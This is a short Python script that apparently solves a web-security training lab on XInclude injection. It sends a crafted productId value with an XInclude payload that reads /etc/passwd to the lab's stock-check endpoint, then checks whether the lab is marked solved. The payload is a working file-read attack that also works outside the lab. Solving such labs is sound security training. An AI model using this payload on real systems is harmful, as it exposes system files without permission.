import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: Exploiting XInclude to retrieve files')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

INCLUSION = '<inc xmlns:xi="http://www.w3.org/2001/XInclude">' 
ref = '<xi:include parse="text" href="file:///etc/passwd"/>'
xxe = {'productId':INCLUSION+ref+'</inc>','storeId':'1'}

r = requests.post("https://" + lab.id + ".web-security-academy.net/product/stock", data=xxe)
print(r.text)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")
